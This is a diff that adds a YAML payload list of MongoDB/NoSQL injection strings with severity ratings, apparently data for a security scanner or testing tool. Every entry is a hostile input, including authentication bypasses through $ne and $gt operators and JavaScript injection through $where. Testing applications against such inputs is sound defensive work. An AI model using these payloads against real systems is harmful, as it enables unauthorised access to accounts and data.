@@ -1,0 +1,49 @@
+﻿payloads:
+  - payload: '{"$gt": ""}'
+    description: MongoDB $gt operator - always true
+    severity: high
+    bypass_waf: false
+  - payload: '{"$ne": null}'
+    description: MongoDB $ne null - auth bypass
+    severity: critical
+    bypass_waf: false
+  - payload: '{"$regex": ".*"}'
+    description: MongoDB regex match all
+    severity: high
+    bypass_waf: false
+  - payload: '{"$exists": true}'
+    description: MongoDB $exists operator
+    severity: medium
+    bypass_waf: false
+  - payload: '{"$where": "1==1"}'
+    description: MongoDB $where JavaScript injection
+    severity: critical
+    bypass_waf: false
+  - payload: '{"$or": [{"a": 1}]}'
+    description: MongoDB $or operator injection
+    severity: high
+    bypass_waf: false
+  - payload: 'username[$ne]=admin&password[$ne]=wrong'
+    description: URL-encoded MongoDB operator injection
+    severity: critical
+    bypass_waf: false
+  - payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    description: MongoDB auth bypass via $gt on both fields
+    severity: critical
+    bypass_waf: false
+  - payload: 'true, $where: 1==1'
+    description: NoSQLi via JavaScript condition
+    severity: critical
+    bypass_waf: false
+  - payload: "'; return true; var x='"
+    description: NoSQLi JavaScript injection
+    severity: critical
+    bypass_waf: false
+  - payload: '{"$in": ["admin", "root"]}'
+    description: MongoDB $in operator injection
+    severity: high
+    bypass_waf: false
+  - payload: '{"$nin": []}'
+    description: MongoDB $nin empty array bypass
+    severity: high
+    bypass_waf: false
